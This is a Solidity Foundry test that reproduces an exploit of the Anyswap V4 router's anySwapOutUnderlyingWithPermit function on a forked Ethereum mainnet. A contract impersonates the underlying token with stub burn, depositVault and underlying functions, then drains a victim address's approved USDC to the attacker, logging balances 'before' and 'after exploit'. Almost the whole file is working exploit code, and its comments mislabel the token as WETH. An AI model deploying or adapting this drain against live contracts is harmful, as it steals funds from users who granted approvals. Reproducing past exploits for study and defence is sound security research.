// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
// import "../test/interfaces/IERC20.sol";
import "../interface.sol";

contract ContractTest is Test {
    address usdc_e_Address = 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    AnyswapV4Router any = AnyswapV4Router(0xe95fD76CF16008c12FF3b3a937CB16Cd9Cc20284);
    AnyswapV1ERC20 any20 = AnyswapV1ERC20(0xe95fD76CF16008c12FF3b3a937CB16Cd9Cc20284);
    IERC20 usdc_e = IERC20(0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0);
    address vic = 0x7B4B2E93a2b7bECa37C283A947B87C4C7481dE3f;

    function setUp() public {
        cheats.createSelectFork("https://rpc.ankr.com/eth", 20888570); // fork mainnet block number 14037236
    }

    function testExample() public {
        //https://etherscan.io/tx/0xe50ed602bd916fc304d53c4fed236698b71691a95774ff0aeeb74b699c6227f7
        //    anySwapOutUnderlyingWithPermit(
        //     address from,
        //     address token,
        //     address to,
        //     uint amount,
        //     uint deadline,
        //     uint8 v,
        //     bytes32 r,
        //     bytes32 s,
        //     uint toChainID
        //   )

        uint256 allowance = usdc_e.allowance(vic, address(any));
        uint256 balance = usdc_e.balanceOf(vic);
        uint256 amuntToDrain = balance < allowance ? balance : allowance;

        any.anySwapOutUnderlyingWithPermit(
            vic,
            address(this),
            msg.sender,
            amuntToDrain,
            100_000_000_000_000_000_000,
            0,
            "0x",
            "0x",
            137
        );
        emit log_named_uint("Before exploit, WETH balance of attacker:", usdc_e.balanceOf(msg.sender));
        usdc_e.transfer(msg.sender, amuntToDrain);
        //uint sender = weth.balanceOf(msg.sender);
        emit log_named_uint("After exploit, WETH balance of attacker:", usdc_e.balanceOf(msg.sender));
    }

    function burn(address from, uint256 amount) external pure returns (bool) {
        amount;
        from;
        return true;
    }

    function depositVault(uint256 amount, address to) external pure returns (uint256) {
        amount;
        to;
        return 1;
    }

    function underlying() external view returns (address) {
        return usdc_e_Address;
    }
}